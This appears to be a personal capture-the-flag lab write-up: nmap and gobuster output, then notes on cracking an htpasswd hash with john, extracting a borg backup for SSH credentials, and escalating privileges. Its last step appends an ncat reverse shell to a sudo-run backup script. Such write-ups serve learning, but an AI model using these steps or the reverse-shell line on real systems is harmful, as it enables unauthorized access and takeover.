@@ -1,0 +1,89 @@
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 13:07 CEST
+Nmap scan report for 10.10.177.210
+Host is up (0.048s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dbb270f307ac32003f81b8d03a89f365 (RSA)
+|   256 68e6852f69655be7c6312c8e4167d7ba (ECDSA)
+|_  256 562c7992ca23c3914935fadd697ccaab (ED25519)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=4/26%OT=22%CT=1%CU=36175%PV=Y%DS=2%DC=T%G=Y%TM=6449062
+OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
+OS:1NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
+OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT      ADDRESS
+1   37.29 ms 10.9.0.1
+2   62.57 ms 10.10.177.210
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.87 seconds
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.177.210
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/04/26 13:08:43 Starting gobuster in directory enumeration mode
+===============================================================
+[2K/admin                (Status: 301) [Size: 314] [--> http://10.10.177.210/admin/]
+[2K/etc                  (Status: 301) [Size: 312] [--> http://10.10.177.210/etc/]
+[2K/server-status        (Status: 403) [Size: 278]
+
+===============================================================
+2023/04/26 13:24:15 Finished
+===============================================================
+
+
+found some credentials in /etc: music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+
+also found some squid.conf in /etc:	auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
+					auth_param basic children 5
+					auth_param basic realm Squid Basic Authentication
+					auth_param basic credentialsttl 2 hours
+					acl auth_users proxy_auth REQUIRED
+					http_access allow auth_users
+
+the archive downloaded under /admin seems to be a borg backup archive that requires a passphrase
+
+the aforementioned password seems to be hashed as md5apr1 with mode 1600 in hashcat 
+
+put the credentials in a file called hash.txt and bruteforcing it with the command: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+got the credentials: music_archive:squidward
+
+found out what borg archives are contained in final_archive by navigating there and executing the command: borg list .
+
+extracted the music_archive with the following command: borg extract ./home/field/dev/final_archive::music_archive
+
+found credentials presumably for ssh: alex:S3cretP@s3
+
+looking for priv esc vectors with linpeas 
+
+found some interesting files:	/var/www/html/etc/squid/passwd
+				/etc/mp3backups/backup.sh
+
+added write permissions to backup.sh with chmod +w 
+
+added the following command: ncat 10.9.58.163 4444 -e /bin/sh
+
+received the reverse shell on attacker machine after executing backup.sh with sudo privileges	
